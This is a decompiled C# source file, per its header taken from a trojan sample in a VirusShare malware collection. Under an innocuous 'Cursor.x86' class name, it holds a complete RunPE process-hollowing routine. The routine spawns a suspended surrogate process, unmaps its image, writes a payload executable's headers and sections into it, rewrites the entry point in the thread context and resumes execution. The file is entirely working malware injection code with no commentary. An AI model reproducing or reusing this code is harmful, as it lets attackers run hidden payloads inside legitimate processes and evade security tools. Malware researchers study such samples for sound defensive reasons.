﻿// Decompiled with JetBrains decompiler
// Type: Cursor.x86
// Assembly: Cursor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B150258B-E423-436E-A699-590287945A17
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Inject.bq-67613154dd98d80190c687cbae943551822d56427c2fb063c0c7a7e2b640fa5d.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace Cursor
{
  public class x86
  {
    private static readonly int[] prot = new int[8]
    {
      1,
      16,
      2,
      32,
      4,
      64,
      4,
      64
    };

    [DebuggerNonUserCode]
    public x86()
    {
    }

    public static void RunPE(byte[] bytes, string surrogateProcess)
    {
      int int32 = BitConverter.ToInt32(bytes, 60);
      int int16 = (int) BitConverter.ToInt16(bytes, checked (int32 + 6));
      IntPtr size1 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 84)));
      byte[] sInfo = new byte[68];
      IntPtr[] pInfo = new IntPtr[4];
      IntPtr num1;
      if (!x86.Win32.CreateProcess((string) null, new StringBuilder(surrogateProcess), num1, num1, false, 4, num1, (string) null, sInfo, pInfo))
        return;
      uint[] ctxt = new uint[179];
      ctxt[0] = 65538U;
      IntPtr bufr;
      IntPtr numRead;
      if (x86.Win32.GetThreadContext(pInfo[1], ctxt) && x86.Win32.ReadProcessMemory(pInfo[0], new IntPtr(checked ((long) ctxt[41] + 8L)), ref bufr, new IntPtr(4), ref numRead) && x86.Win32.NtUnmapViewOfSection(pInfo[0], bufr) == 0U)
      {
        IntPtr hProc1 = pInfo[0];
        IntPtr num2 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 52)));
        IntPtr addr1 = num2;
        IntPtr num3 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 80)));
        IntPtr size2 = num3;
        IntPtr baseAddr1 = x86.Win32.VirtualAllocEx(hProc1, addr1, size2, 12288, 64);
        bool flag = x86.Win32.WriteProcessMemory(pInfo[0], baseAddr1, bytes, size1, ref numRead);
        int num4 = checked (int16 - 1);
        int num5 = 0;
        while (num5 <= num4)
        {
          int[] dst1 = new int[10];
          Buffer.BlockCopy((Array) bytes, checked (int32 + 248 + num5 * 40), (Array) dst1, 0, 40);
          byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
          Buffer.BlockCopy((Array) bytes, dst1[5], (Array) dst2, 0, dst2.Length);
          IntPtr hProc2 = pInfo[0];
          num3 = new IntPtr(checked (baseAddr1.ToInt32() + dst1[3]));
          IntPtr baseAddr2 = num3;
          byte[] buff = dst2;
          num2 = new IntPtr(dst2.Length);
          IntPtr size3 = num2;
          ref IntPtr local1 = ref numRead;
          flag = x86.Win32.WriteProcessMemory(hProc2, baseAddr2, buff, size3, ref local1);
          IntPtr hProc3 = pInfo[0];
          num3 = new IntPtr(checked (baseAddr1.ToInt32() + dst1[3]));
          IntPtr addr2 = num3;
          num2 = new IntPtr(dst1[2]);
          IntPtr size4 = num2;
          int newProt = x86.prot[dst1[9] >> 29 & 7];
          int num6;
          ref int local2 = ref num6;
          flag = x86.Win32.VirtualProtectEx(hProc3, addr2, size4, newProt, ref local2);
          checked { ++num5; }
        }
        IntPtr hProc4 = pInfo[0];
        num3 = new IntPtr(checked ((long) ctxt[41] + 8L));
        IntPtr baseAddr3 = num3;
        byte[] bytes1 = BitConverter.GetBytes(baseAddr1.ToInt32());
        num2 = new IntPtr(4);
        IntPtr size5 = num2;
        ref IntPtr local = ref numRead;
        flag = x86.Win32.WriteProcessMemory(hProc4, baseAddr3, bytes1, size5, ref local);
        ctxt[44] = checked ((uint) (baseAddr1.ToInt32() + BitConverter.ToInt32(bytes, int32 + 40)));
        x86.Win32.SetThreadContext(pInfo[1], ctxt);
      }
      x86.Win32.ResumeThread(pInfo[1]);
    }

    [SuppressUnmanagedCodeSecurity]
    private class Win32
    {
      [DebuggerNonUserCode]
      public Win32()
      {
      }

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool CreateProcess(
        string appName,
        StringBuilder commandLine,
        IntPtr procAttr,
        IntPtr thrAttr,
        [MarshalAs(UnmanagedType.Bool)] bool inherit,
        int creation,
        IntPtr env,
        string curDir,
        byte[] sInfo,
        IntPtr[] pInfo);

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);

      [DllImport("ntdll")]
      public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool ReadProcessMemory(
        IntPtr hProc,
        IntPtr baseAddr,
        ref IntPtr bufr,
        IntPtr bufrSize,
        ref IntPtr numRead);

      [DllImport("kernel32")]
      public static extern int ResumeThread(IntPtr hThr);

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);

      [DllImport("kernel32")]
      public static extern IntPtr VirtualAllocEx(
        IntPtr hProc,
        IntPtr addr,
        IntPtr size,
        int allocType,
        int prot);

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool VirtualProtectEx(
        IntPtr hProc,
        IntPtr addr,
        IntPtr size,
        int newProt,
        ref int oldProt);

      [DllImport("kernel32")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool WriteProcessMemory(
        IntPtr hProc,
        IntPtr baseAddr,
        byte[] buff,
        IntPtr size,
        ref IntPtr numRead);
    }
  }
}